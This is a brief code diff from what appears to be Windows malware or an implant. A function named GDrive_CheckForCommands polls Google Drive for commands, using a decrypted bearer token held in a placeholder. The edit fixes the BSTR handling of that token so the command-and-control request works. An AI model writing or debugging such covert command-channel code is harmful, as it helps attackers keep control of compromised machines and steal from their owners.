@@ -61,7 +61,7 @@ static BOOL GDrive_CheckForCommands(char *buffer, DWORD bufferSize) {
         hr = pRequest->Open(bstrMethod, bstrUrl, varAsync);
         if (SUCCEEDED(hr)) {
             LPCWSTR decryptedToken = L"Bearer [REAL_TOKEN_DESCIFRADO]";
-            pRequest->SetRequestHeader(L"Authorization", decryptedToken);
+            BSTR bstrHeader = SysAllocString(L"Authorization"); BSTR bstrValue = SysAllocString(decryptedToken); pRequest->SetRequestHeader(bstrHeader, bstrValue); SysFreeString(bstrHeader); SysFreeString(bstrValue);
 
             VARIANT varEmpty; VariantInit(&varEmpty);
             hr = pRequest->Send(varEmpty);
